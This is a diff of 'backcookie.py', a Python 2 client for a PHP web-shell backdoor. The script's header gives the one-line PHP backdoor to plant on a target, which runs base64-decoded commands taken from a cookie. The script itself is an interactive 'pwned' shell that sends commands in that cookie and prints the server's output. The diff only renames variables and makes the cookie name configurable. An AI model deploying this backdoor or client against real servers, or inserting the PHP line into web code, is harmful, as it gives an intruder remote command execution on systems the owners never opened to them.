@@ -16,7 +16,7 @@ from urllib2 import build_opener, HTTPHandler #
 # It goes with a range from 1 to 0, but you can customize the parameter.   #
 # Example: python backcookie.py http://target.com/shell.php                #
 #                                                                          #
-# You can change the name of the cookie, in line 46.                       #
+# You can change the name of the cookie, in line 37.                       #
 # a value of 1 for the name of your cookie, also in php.                   #
 # Example: system(base64_decode($_COOKIE["yourcookie"]));                  #####
 # so that the connection is successful.                                        #
@@ -33,23 +33,28 @@ elif "win" in sys.platform:
 else:
     pass
 
+# Name of the cookie
+cookie = "1"
+bc = "Backcookie"
+
+# Colors
 class color:
     azul = '\033[94m'
     rojo = '\033[91m'
     verde = '\033[92m'
     blanco = '\033[0m'
 
-def backcookie(comando, a, debugLevel=0):
+def backcookie(c, a, debugLevel=0): # c is command & a is agent
     o = build_opener(HTTPHandler(debuglevel=debugLevel))
     o.addheaders = [
         ('User-Agent', a),
-        ('Cookie', '1={0}'.format(comando.encode('base64'))),
+        ('Cookie', cookie + '={0}'.format(c.encode('base64')))
     ]
     l = o.open(argv[1])
     print color.azul + l.read().strip() + color.blanco
 
 def main():
-    print color.blanco + "\t\t-------------" + color.rojo + "Backcookie" + color.blanco + "------------"
+    print color.blanco + "\t\t-------------" + color.rojo + bc + color.blanco + "------------"
     print "\t\t+    Developed by: @mrjopino      +"
     print "\t\t+             To play             +"
     print "\t\t-----------------------------------\n\n"
@@ -69,16 +74,16 @@ def main():
 
     while True:
         
-        comando = raw_input("pwned:~$ ")
-        if comando != "exit": #exit console backcookie
-            backcookie(comando, a)
+        c = raw_input("pwned:~$ ")
+        if c != "exit": #exit console backcookie
+            backcookie(c, a)
         else:
             print "\t\t-------------\033[94mDeveloper\033[0m------------"
             print "\t\t+        José Pino (Fraph)       +"
             print "\t\t+       Security researcher      +"
             print "\t\t+            @mrjopino           +"
             print "\t\t----------------------------------\n\n"
-            print color.azul + "[-] " + color.rojo + "Backcookie OFF\n" + color.blanco
+            print color.azul + "[-] " + color.rojo + bc + " OFF\n" + color.blanco
             break
 
 if __name__ == "__main__":
